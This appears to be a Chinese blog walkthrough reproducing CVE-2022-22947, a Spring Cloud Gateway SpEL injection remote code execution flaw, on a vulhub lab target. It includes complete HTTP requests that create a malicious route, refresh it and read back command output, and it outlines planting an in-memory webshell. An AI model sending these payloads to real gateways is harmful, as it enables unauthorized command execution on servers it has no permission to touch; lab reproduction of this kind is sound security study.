# 漏洞复现-CVE-2022-22947-Spring Cloud Gateway RCE - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/16318303.html`](https://www.cnblogs.com/cute-puli/p/16318303.html)

# 0x00 实验环境

攻击机：Ubuntu

靶场：vulhub 搭建的靶场环境

# 0x01 影响版本

```

```
3.1.0
3.0.0 到 3.0.6 旧的不受支持的版本也受影响，是 Spring Cloud Gateway 的一个 SpEL 命令注入漏洞
```

```

# 0x02 漏洞复现

（1）访问页面，默认路径 gateway 在页面 actuator 可访问，如下图所示：

![](img/5131b8bdcfcadb81d3094644346fdf4f.png)

（2）http://x.x.x.x:8080/actuator/gateway

![](img/3ff1bc1f0797a06390b82952c4857e76.png)

使用如下 payload：

```
POST /actuator/gateway/routes/hacktest HTTP/1.1 Host:x.x.x.x:8080 Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

![](img/15fd5e118a2baa33c56a9d04b2f89fce.png)

 201 代表创建成功

（3）访问 url 后修改为 post 请求即可触发该 payload：

```
POST /actuator/gateway/refresh HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

![](img/a44f62dcc181493f0b0e8db5d4f62c83.png)

 （4）然后访问以下链接即可回显命令执行的结果：

http://x.x.x.x:8080/actuator/gateway/routes/hacktest

![](img/40920483de3484b57e1d875f9c93230a.png)

 （5）写入内存马的方式：将如下文件编译成**class 文件**后再编码为**base64 格式**，替换“**id**”命令：**https://mp.weixin.qq.com/s/2wKB3jACAkIiIZ96tVb5fA**，具体参考这篇文章：

![](img/1e340980b100d257d1d56ba019b8aebd.png)

 内部 poc 可以写入成功（**poc 暂时不对外公布**）：

![](img/62abc75fa6ad2506d9e8cbf7727608be.png)

 （6）反弹 shell 的暂时还没成功。

# 0x03 漏洞原理

**https://www.jianshu.com/p/5a3dfdc4be8b**

# 0x04 参考文献

**https://www.jianshu.com/p/5a3dfdc4be8b**

# 0x05 免责声明

本漏洞复现文章仅用于学习、工作与兴趣爱好，并立志为网络安全奉献一份力量，凡是利用本博客相关内容的无良**hackers**造成的安全事故均与本人无关！